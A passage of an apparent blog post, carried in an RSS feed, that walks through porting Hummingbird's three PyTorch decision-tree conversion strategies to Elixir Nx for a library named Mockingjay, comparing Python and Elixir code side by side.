<p>At this point, you should feel comfortable enough to start implementing the code. I found this to be a very iterative process, meaning I would think I had a grasp on something, then would start working on implementing it, then would realize I did not understand it as well as I had thought and would work my way back through the previous steps. </p>
<h2 id="example">Example</h2>

<h2 id="class-vs-behaviour">Class vs. Behaviour</h2>
<p>As a result of the reading and comprehension I did of the Hummingbird code base, I realized fairly early on that my library was going to have some key differences. One of the main reasons for these differences was the fact that the Hummingbird code base was built as a retroactive library that needed to cater to existing APIs that existed throughout the Python ecosystem. They chose to only add support for converting decision trees according to the SKLearn API. I, conversely, chose to write Mockingjay in such a way that it would be incumbent upon the authors of decision tree libraries to implement a protocol to interface with Mockingjay's <code>convert</code> function. This difference meant that I could establish a <code>Mockingjay.Tree</code> data structure that I would use throughout my library, rather than having to reconstruct tree features from various other APIs as is done in Hummingbird. </p>
<p>Next, Hummingbird approaches its pipeline in a very-object oriented manner, as makes sense when using Python. Here' we are focusing on the implementation of the three decision tree conversion strategies: GEMM, Tree Traversal, and PErfect Tree Traversal.  It implements the following base class for tree conversions as well as Pytorch networks. </p>
<div><p>üí°</p><p dir="ltr"><span> Since they're inheriting from </span><code><span>torch.nn.model</span></code><span> they must also implement the </span><code><span>forward</span></code><span> method.</span></p></div>
<pre><code>class AbstracTreeImpl(PhysicalOperator):
    """
    Abstract class definig the basic structure for tree-base models.
    """

    def __init__(self, logical_operator, **kwargs):
        super().__init__(logical_operator, **kwargs)

    @abstractmethod
    def aggregation(self, x):
        """
        Method defining the aggregation operation to execute after the model is evaluated.

        Args:
            x: An input tensor

        Returns:
            The tensor result of the aggregation
        """
        pass

class AbstractPyTorchTreeImpl(AbstracTreeImpl, torch.nn.Module):
    """
    Abstract class definig the basic structure for tree-base models implemented in PyTorch.
    """

    def __init__(
        self, logical_operator, tree_parameters, n_features, classes, n_classes, decision_cond="&lt;=", extra_config={}, **kwargs
    ):
        """
        Args:
            tree_parameters: The parameters defining the tree structure
            n_features: The number of features input to the model
            classes: The classes used for classification. None if implementing a regression model
            n_classes: The total number of used classes
            decision_cond: The condition of the decision nodes in the x &lt;cond&gt; threshold order. Default '&lt;='. Values can be &lt;=, &lt;, &gt;=, &gt;
        """
        super(AbstractPyTorchTreeImpl, self).__init__(logical_operator, **kwargs)</code></pre>
<p>They then proceed to inherit from these base classes and have different classes for each of the three decision tree strategies as well as their gradient-boosted counterparts, leaving them with three classes for each strategies (1 base class per strategy, 1 for ensemble implementations, and 1 for normal impementations) and nine total classes. </p>
<p>I chose to approach this using a <code>behaviour</code></p>
<pre><code>defmodule Mockingjay.Strategy do
  @moduledoc false
  @type t :: Nx.Container.t()

  @callback init(data :: any(), opts :: Keyword.t()) :: term()
  @callback forward(x :: Nx.Container.t(), term()) :: Nx.Tensor.t()
  ...
end</code></pre>
<p><code>forward</code> will perform setup functionality depending on the strategy and return the parameters that will need to be passed to <code>forward</code> later on. This allows for a very simple top-level api. The whole top-level <code>mockingjay.ex</code> file can fit here:</p>
<pre><code>  def convert(data, opts \\ []) do
    {strategy, opts} = Keyword.pop(opts, :strategy, :auto)

    strategy =
      case strategy do
        :gemm -&gt;
          Mockingjay.Strategies.GEMM

        :tree_traversal -&gt;
          Mockingjay.Strategies.TreeTraversal

        :perfect_tree_traversal -&gt;
          Mockingjay.Strategies.PerfectTreeTraversal

        :auto -&gt;
          Mockingjay.Strategy.get_strategy(data, opts)

        _ -&gt;
          raise ArgumentError,
                "strategy must be one of :gemm, :tree_traversal, :perfect_tree_traversal, or :auto"
      end

    {post_transform, opts} = Keyword.pop(opts, :post_transform, nil)
    state = strategy.init(data, opts)

    fn data -&gt;
      result = strategy.forward(data, state)
      {_, n_trees, n_classes} = Nx.shape(result)

      result
      |&gt; aggregate(n_trees, n_classes)
      |&gt; post_transform(post_transform, n_classes)
    end
  end  </code></pre>
<p>As you can see, the use of a behaviour here allows a strategy-agnostic approach to generating a prediction pipeline. In the object-oriented implementation, each class implements <code>init</code>, <code>forward</code>, <code>aggregate</code>, and <code>post_transform</code>. We get the same result from a functional pipeline approach, where each step generates the needed information as input parameters for the next step. So, instead of storing intermediate results as object properties or values in an object's <strong><code>__dict__</code></strong>, we just pass them along in the pipeline. I would argue this creates a much simpler and easier to follow implementation (but I am also quite biased).</p>
<h2 id="pytorch-to-nx">PyTorch to Nx </h2>
<p>For these examples, we will be looking at porting the implementations of the <code>forward</code> function for the three conversion strategies from Python to Nx.</p>
<h4 id="gemm">GEMM</h4>
<p>Next, let's look at the <code>forward</code> function implementation for GEMM, one of the three conversion strategies. In Hummingbird, they implemented the <code>forward</code> step in the base class for each strategy. So given three GEMM classes with the signatures of <code>GEMMTreeImpl(AbstractPyTorchTreeImpl)</code>, <code>GEMMDecisionTreeImpl(GEMMTreeImpl)</code>, and <code>GEMMGBDTImpl(GEMMTreeImpl)</code>, the <code>forward</code> function is defined in the <code>GEMMTreeImpl</code> class, since both ensemble and non-ensemble decision tree models share the same forward step. </p>
<pre><code>def forward(self, x):
      x = x.t()
      x = self.decision_cond(torch.mm(self.weight_1, x), self.bias_1)
      x = x.view(self.n_trees, self.hidden_one_size, -1)
      x = x.float()

      x = torch.matmul(self.weight_2, x)

      x = x.view(self.n_trees * self.hidden_two_size, -1) == self.bias_2
      x = x.view(self.n_trees, self.hidden_two_size, -1)
      if self.tree_op_precision_dtype == "float32":
          x = x.float()
      else:
          x = x.double()

      x = torch.matmul(self.weight_3, x)
      x = x.view(self.n_trees, self.hidden_three_size, -1)</code></pre>
<p>Now, here is the Nx implementation:</p>
<pre><code>@impl true
  deftransform forward(x, {arg, opts}) do
    opts =
      Keyword.validate!(opts, [
        :condition,
        :n_trees,
        :n_classes,
        :max_decision_nodes,
        :max_leaf_nodes,
        :n_weak_learner_classes,
        :custom_forward
      ])

    _forward(x, arg, opts)
  end

  defnp _forward(x, arg, opts \\ []) do
    %{mat_A: mat_A, mat_B: mat_B, mat_C: mat_C, mat_D: mat_D, mat_E: mat_E} = arg

    condition = opts[:condition]
    n_trees = opts[:n_trees]
    n_classes = opts[:n_classes]
    max_decision_nodes = opts[:max_decision_nodes]
    max_leaf_nodes = opts[:max_leaf_nodes]
    n_weak_learner_classes = opts[:n_weak_learner_classes]

    mat_A
    |&gt; Nx.dot([1], x, [1])
    |&gt; condition.(mat_B)
    |&gt; Nx.reshape({n_trees, max_decision_nodes, :auto})
    |&gt; then(&amp;Nx.dot(mat_C, [2], [0], &amp;1, [1], [0]))
    |&gt; Nx.reshape({n_trees * max_leaf_nodes, :auto})
    |&gt; Nx.equal(mat_D)
    |&gt; Nx.reshape({n_trees, max_leaf_nodes, :auto})
    |&gt; then(&amp;Nx.dot(mat_E, [2], [0], &amp;1, [1], [0]))
    |&gt; Nx.reshape({n_trees, n_weak_learner_classes, :auto})
    |&gt; Nx.transpose()
    |&gt; Nx.reshape({:auto, n_trees, n_classes})
  end
</code></pre>
<p>Do not be distracted by the length of this code snippet, as much of the lines are taken up by validating arguments. Let's look at a more stripped-down version without that:</p>
<pre><code>@impl true
  deftransform forward(x, {arg, opts}) do
    _forward(x, arg, opts)
  end

  defnp _forward(x, arg, opts \\ []) do
    mat_A
    |&gt; Nx.dot([1], x, [1])
    |&gt; condition.(mat_B)
    |&gt; Nx.reshape({n_trees, max_decision_nodes, :auto})
    |&gt; then(&amp;Nx.dot(mat_C, [2], [0], &amp;1, [1], [0]))
    |&gt; Nx.reshape({n_trees * max_leaf_nodes, :auto})
    |&gt; Nx.equal(mat_D)
    |&gt; Nx.reshape({n_trees, max_leaf_nodes, :auto})
    |&gt; then(&amp;Nx.dot(mat_E, [2], [0], &amp;1, [1], [0]))
    |&gt; Nx.reshape({n_trees, n_weak_learner_classes, :auto})
    |&gt; Nx.transpose()
    |&gt; Nx.reshape({:auto, n_trees, n_classes})
  end
</code></pre>
<p>Let's take a look at some obvious difference:</p>
<ul>
<li>The <code>Nx</code> code does not have to transpose in the first step since <code>Nx.dot/4</code> allows you to specify the contracting axes.</li>
<li>You can use <code>Nx.dot/6</code> to get the same behavior as <code>torch.matmul</code>
<ul>
<li><code>torch.matmul</code> does a lot of wizardry with broadcasting to make this instance work</li>
</ul>
</li>
<li>We use functions such as <code>Nx.equal</code> to fit into the pipeline rather than using the <code>==</code> oeprator (which would work outside of a pipeline)</li>
<li><code>torch.view</code> is equivalent to <code>Nx.reshape</code></li>
<li><code>Nx</code> uses the <code>:auto</code> atom to where <code>torch</code> uses <code>-1</code> to reference infering the sie of an axis</li>
</ul>

<p>Outside of these differences, the code translates fairly easily. Let's take a look at a bit of a more complex instance.</p>
<h4 id="tree-traversal">Tree Traversal</h4>
<p>Here is the Python implementation:</p>
<pre><code>def _expand_indexes(self, batch_size):
        indexes = self.nodes_offset
        indexes = indexes.expand(batch_size, self.num_trees)
        return indexes.reshape(-1)

def forward(self, x):
        indexes = self.nodes_offset
        indexes = indexes.expand(batch_size, self.num_trees).reshape(-1)

        for _ in range(self.max_tree_depth):
            tree_nodes = indexes
            feature_nodes = torch.index_select(self.features, 0, tree_nodes).view(-1, self.num_trees)
            feature_values = torch.gather(x, 1, feature_nodes)

            thresholds = torch.index_select(self.thresholds, 0, indexes).view(-1, self.num_trees)
            lefts = torch.index_select(self.lefts, 0, indexes).view(-1, self.num_trees)
            rights = torch.index_select(self.rights, 0, indexes).view(-1, self.num_trees)

            indexes = torch.where(self.decision_cond(feature_values, thresholds), lefts, rights).long()
            indexes = indexes + self.nodes_offset
            indexes = indexes.view(-1)

        output = torch.index_select(self.values, 0, indexes).view(-1, self.num_trees, self.n_classes)</code></pre>
<p>And here is the Nx implementation:</p>
<pre><code>defn _forward(x, features, lefts, rights, thresholds, nodes_offset, values, opts \\ []) do
    max_tree_depth = opts[:max_tree_depth]
    num_trees = opts[:num_trees]
    n_classes = opts[:n_classes]
    condition = opts[:condition]
    unroll = opts[:unroll]

    batch_size = Nx.axis_size(x, 0)

    indices =
      nodes_offset
      |&gt; Nx.broadcast({batch_size, num_trees})
      |&gt; Nx.reshape({:auto})

    {indices, _} =
      while {tree_nodes = indices, {features, lefts, rights, thresholds, nodes_offset, x}},
            _ &lt;- 1..max_tree_depth,
            unroll: unroll do
        feature_nodes = Nx.take(features, tree_nodes) |&gt; Nx.reshape({:auto, num_trees})
        feature_values = Nx.take_along_axis(x, feature_nodes, axis: 1)
        local_thresholds = Nx.take(thresholds, tree_nodes) |&gt; Nx.reshape({:auto, num_trees})
        local_lefts = Nx.take(lefts, tree_nodes) |&gt; Nx.reshape({:auto, num_trees})
        local_rights = Nx.take(rights, tree_nodes) |&gt; Nx.reshape({:auto, num_trees})

        result =
          Nx.select(
            condition.(feature_values, local_thresholds),
            local_lefts,
            local_rights
          )
          |&gt; Nx.add(nodes_offset)
          |&gt; Nx.reshape({:auto})

        {result, {features, lefts, rights, thresholds, nodes_offset, x}}
      end

    values
    |&gt; Nx.take(indices)
    |&gt; Nx.reshape({:auto, num_trees, n_classes})
  end</code></pre>
<p>Here there are some much more striking differences, namely the use of <code>Nx</code>'s <code>while</code> expression compared to a <code>for</code> loop in Python. We use <code>while</code> in this case since it can achieve the same purpose as the Python <code>for</code> loop and it is supported by <code>Nx</code> within a <code>defn</code> expression. Otherwise, we might have to perform some of the calculations within a <code>deftransform</code>, as we will see in the next example.  Another obvious difference is that in the Nx implementation, we have to pass the required variables around throughout these operation, whereas Python can use stored class attributes. </p>
<p>Still, the conversion is quite straightforward. I hope you are beginning to see that this is not an impossible effort, and can be accomplished given you have a firm understanding of the source material.</p>
<h4 id="perfect-tree-traversal">Perfect Tree Traversal</h4>
<p>Lastly, let's look at the last conversion strategy. Yet again, this conversion is even slightly more complex, but hopefully seeing this example will help you in your case:</p>
<pre><code>def forward(self, x):
        prev_indices = (self.decision_cond(torch.index_select(x, 1, self.root_nodes), self.root_biases)).long()
        prev_indices = prev_indices + self.tree_indices
        prev_indices = prev_indices.view(-1)

        factor = 2
        for nodes, biases in zip(self.nodes, self.biases):
            gather_indices = torch.index_select(nodes, 0, prev_indices).view(-1, self.num_trees)
            features = torch.gather(x, 1, gather_indices).view(-1)
            prev_indices = (
                factor * prev_indices + self.decision_cond(features, torch.index_select(biases, 0, prev_indices)).long()
            )

        output = torch.index_select(self.leaf_nodes, 0, prev_indices).view(-1, self.num_trees, self.n_classes)
</code></pre>
<p>And the Elixir implementation:</p>
<pre><code>defnp _forward(
          x,
          root_features,
          root_thresholds,
          features,
          thresholds,
          values,
          indices,
          opts \\ []
        ) do
    prev_indices =
      x
      |&gt; Nx.take(root_features, axis: 1)
      |&gt; opts[:condition].(root_thresholds)
      |&gt; Nx.add(indices)
      |&gt; Nx.reshape({:auto})
      |&gt; forward_reduce_features(x, features, thresholds, opts)

    Nx.take(values, prev_indices)
    |&gt; Nx.reshape({:auto, opts[:num_trees], opts[:n_classes]})
  end

  deftransformp forward_reduce_features(prev_indices, x, features, thresholds, opts \\ []) do
    Enum.zip_reduce(
      Tuple.to_list(features),
      Tuple.to_list(thresholds),
      prev_indices,
      fn nodes, biases, acc -&gt;
        gather_indices = nodes |&gt; Nx.take(acc) |&gt; Nx.reshape({:auto, opts[:num_trees]})
        features = Nx.take_along_axis(x, gather_indices, axis: 1) |&gt; Nx.reshape({:auto})

        acc
        |&gt; Nx.multiply(@factor)
        |&gt; Nx.add(opts[:condition].(features, Nx.take(biases, acc)))
      end
    )
  end</code></pre>
<p>You can see that in this case, we have a function defined in a <code>deftransform</code> within our <code>forward</code> pipeline. Why is this so? Well, when writing definitions within <code>defn</code> you forfeit the use of the default Elixir kernel for the <code>Nx.Kernel</code> module. If you want full access to all of the normal Elixir modules, you need to use a <code>deftransform</code>. We needed to use <code>Enum.zip_reduce</code> in this instance (rather than <code>Nx</code>'s <code>while</code> like before) since the <code>features</code> and <code>thresholds</code> lists are not of uniform shape. Their shape represents the length of a given depth of a binary tree, so they will be a nested list of lengths <code>[1,2,4,8...]</code>. This is an optimization as opposed to normal <code>TreeTraversal</code>, but required a bit of a different approach as opposed to the Python implementation which took advantage of <code>torch.nn.ParameterList</code> to build out the same lists. You might also notice the use of <code>Tuple.to_list</code> on lines 25 and 26. This was required since we needed <code>features</code> and <code>thresholds</code> to be stored in <code>Nx.container</code>'s when passed into the <code>deftransform</code>, and <code>Tuple</code> implements the <code>Nx.Container</code> protocol, while lists do not. Even still, given that knowledge of the intricacies of <code>defn</code> and <code>deftransform</code>, the final ported solution is very similar to the reference solution.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this post, I tried to accomplish several things at once, and perhaps that lead to a cluttered article, but I felt the need to address all of these points at once. I do not mean to suggest that Machine Learning has no place in Python or that Python will not continue to be the most dominant player in Machine Learning, but that I think some healthy competition is a good thing, and that perhaps Python does have some shortcomings that might give other languages valid reasons to coexist in the space. </p>
<p>Next, I wanted to address some specifics as to what Elixir has to offer to the machine learning space. I think it is uniquely positioned to be quite competitive considering the large community push to support more and more libraries, as well as the large application development community that can benefit from an in-house solution.</p>
<p>Lastly, I wanted to share some practical tips for those looking to move on from Python to Elixir, but feeling somewhat helpless in the process. I think that Sean Moriarity's book that I mentioned at the beginning of this article is an invaluable resource and great step in the education of machine learning for Elixir developers, but it can nonetheless feel daunting to seemingly throw out existing working solutions for new-fangled, perhaps not as well respected solutions. I hope I showed how anybody can approach this problem, and any existing Elixir developer can be a machine learning developer going forward. The ground work has been laid, and the tools are available. Thank you for reading (especially if you made it to the end)!</p>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I've skimmed 66520 newsgroups trying to find some life on the Usenet (2020) (148 pts)]]></title>
            <link>https://mastodon.sdf.org/@cfenollosa/103469996345323076</link>
            <guid>36859510</guid>
            <pubDate>Tue, 25 Jul 2023 08:26:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mastodon.sdf.org/@cfenollosa/103469996345323076">https://mastodon.sdf.org/@cfenollosa/103469996345323076</a>, See on <a href="https://news.ycombinator.com/item?id=36859510">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
    </channel>
</rss>